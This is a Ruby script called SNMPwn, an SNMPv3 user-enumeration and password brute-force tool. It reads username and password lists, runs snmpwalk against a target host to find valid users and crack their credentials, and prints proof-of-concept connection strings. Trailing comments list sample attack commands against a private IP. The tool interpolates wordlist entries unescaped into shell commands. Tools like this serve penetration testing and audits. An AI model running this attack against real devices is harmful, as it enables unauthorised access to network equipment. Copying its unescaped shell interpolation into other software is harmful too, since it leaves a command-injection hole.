#!/usr/bin/env ruby
#SNMPwn
#SNMPv3 User Enumeration and Password Attack Script

require 'tty-command'
require 'trollop'
require 'colorize'
require 'logger'

def arguments

  opts = Trollop::options do 
    version "snmpwn v0.95b".light_blue
    banner <<-EOS
    snmpwn v0.95b
      EOS

        opt :host, "SNMPv3 Server IP", :type => String #change to accept lists of hosts too
        opt :enum_users, "Emumerate SNMPv3 Users?" #may remove, not currently using
        opt :users, "List of users you want to try", :type => String
        opt :user, "Specify a single user to try", :type => String #probably remove this in favour of a list
        opt :auth, "SNMP Authentication and Encryption Type. Should be either: authnopriv, noauthnopriv or authpriv", :type => String
        opt :passlist, "Password list for attacks", :type => String
        opt :enclist, "Encryption Password List for AuthPriv types", :type => String

        if ARGV.empty?
          puts "Need Help? Try ./snmpwn --help".red.bold
        exit
      end
    end
  opts
end

def findusers(arg)
  users = []
  userfile = File.readlines(arg[:users]).map(&:chomp)
  cmd = TTY::Command.new(printer: :null)
  
  puts "Enumerating SNMPv3 users".light_blue.bold
  userfile.each do |user|
    out, err = cmd.run!("snmpwalk -u #{user} #{arg[:host]} iso.3.6.1.2.1.1.1.0")
      if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
        puts "Username: #{user} is valid".green.bold
        users << user
      elsif err =~ /authorizationError/i
        puts "Username: #{user} is valid".green.bold
        users << user
      elsif err =~ /snmpwalk: Unknown user name/i
        puts "Username: #{user} is not configured on this host".red.bold
    end
  end
  puts "\nValid Users:".green.bold + "\n#{users.join("\n")}"
  users
end

def attack(arg, users)
  passwords = File.readlines(arg[:passlist]).map(&:chomp)
  cmd = TTY::Command.new(printer: :null)

  puts "\nTesting SNMPv3 without authentication and encryption".light_blue.bold
  users.each do |user|   
    out, err = cmd.run!("snmpwalk -u #{user} #{arg[:host]} iso.3.6.1.2.1.1.1.0")
      if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
        users.delete(user)
        puts "#{user} can connect without a password".green.bold
        puts "To connect for a POC, use this string:\nsnmpwalk -u #{user} #{arg[:host]}".light_magenta
  end
end

  puts "\nTesting SNMPv3 with authentication and without encryption".light_blue.bold
  users.each do |user|
    passwords.each do |password|
      out, err = cmd.run!("snmpwalk -u #{user} -A #{password} #{arg[:host]} -v3 iso.3.6.1.2.1.1.1.0 -l authnopriv")
        if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
          users.delete(user)
          puts "#{user} can connect with the password #{password} ".green.bold
          puts "To connect for a POC, use this string:\nsnmpwalk -u #{user} -A #{password} #{arg[:host]} -v3 -l authnopriv".light_magenta
      end
    end
  end
end

#snmpwalk: USM generic error - appears to happen when authpriv is set but no encryption password is defined with -X
#also happens when wrong encryption type is specified
#if iso.3.6.1.2.1.1.1.0 = STRING: is in response then connected succesfully, otherwise exhaust all usernames and passwords and encryption pass lists



arg = arguments
users = findusers(arg)
attack(arg, users)




#Commands:
#No auth just username
#snmpwalk -u user1 192.168.1.107 -v3 iso.3.6.1.2.1.1.1.0
#Authentication and encryption
#snmpwalk -u user2 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authpriv
#Same again but this user was configured for RW - Is there a way to enumerate that?
#snmpwalk -u user3 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authPriv